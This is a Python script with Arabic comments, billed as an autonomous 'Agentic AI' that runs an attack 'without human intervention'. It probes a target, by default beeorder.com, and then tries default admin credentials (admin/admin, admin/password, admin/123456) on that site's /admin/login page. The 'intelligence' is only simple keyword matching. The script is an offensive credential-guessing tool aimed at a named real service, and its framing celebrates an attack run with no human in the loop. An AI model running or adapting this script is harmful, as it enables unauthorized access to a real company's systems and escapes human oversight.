#!/usr/bin/env python3
"""
🤖 Agentic AI v1 - الذكاء المستقل
يدير الهجوم كاملاً بدون تدخل بشري
"""
import requests, sys, json, os, re, random, time, subprocess
from datetime import datetime
from urllib.parse import urlparse

class AgenticAI:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.brain = []
        self.actions = []
        self.session = requests.Session()
    
    def log(self, msg): print(f"[🤖] {msg}")
    
    def think(self, observation):
        """الذكاء يفكر ويقرر"""
        self.brain.append(observation)
        
        # تحليل بسيط
        if "login" in str(observation).lower():
            return "attack_login"
        elif "api" in str(observation).lower():
            return "attack_api"
        elif "error" in str(observation).lower():
            return "analyze_error"
        else:
            return "recon"
    
    def act(self, action):
        """الذكاء ينفذ"""
        self.actions.append(action)
        self.log(f"   ⚡ {action}")
    
    def recon(self):
        """استطلاع تلقائي"""
        self.act("استطلاع")
        try:
            r = self.session.get(self.target, timeout=5)
            return {"status": r.status_code, "size": len(r.text), "server": r.headers.get("Server","?")}
        except:
            return {"error": "فشل"}
    
    def attack_login(self):
        """هجوم دخول تلقائي"""
        self.act("هجوم دخول")
        creds = [("admin","admin"),("admin","password"),("admin","123456")]
        for user, pwd in creds:
            try:
                r = self.session.post(f"{self.target}/admin/login",
                    data={"email":f"{user}@beeorder.com","password":pwd}, timeout=5)
                if r.status_code == 200 and "error" not in r.text.lower():
                    return {"success": True, "user": user, "pass": pwd}
            except: pass
        return {"success": False}
    
    def analyze_error(self, error):
        """تحليل الأخطاء"""
        self.act("تحليل خطأ")
        if "500" in str(error):
            return {"type": "Server Error", "action": "try_different"}
        elif "404" in str(error):
            return {"type": "Not Found", "action": "fuzz_paths"}
        elif "403" in str(error):
            return {"type": "Forbidden", "action": "try_bypass"}
        return {"type": "Unknown", "action": "continue"}
    
    def run(self):
        """تشغيل مستقل"""
        self.log(f"🤖 Agentic AI: {self.target}")
        self.log("═" * 50)
        
        # 1. استطلاع
        obs = self.recon()
        decision = self.think(obs)
        
        # 2. تنفيذ
        if decision == "attack_login":
            result = self.attack_login()
            self.think(result)
        elif decision == "analyze_error":
            analysis = self.analyze_error(obs)
            self.think(analysis)
        else:
            self.act("مراقبة")
        
        # 3. تقرير
        self.log(f"\n🧠 Brain: {len(self.brain)} observations")
        self.log(f"⚡ Actions: {len(self.actions)}")
        self.log(f"📋 Actions: {self.actions}")
        
        return {"brain": self.brain, "actions": self.actions}

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://beeorder.com"
    ai = AgenticAI(target)
    ai.run()
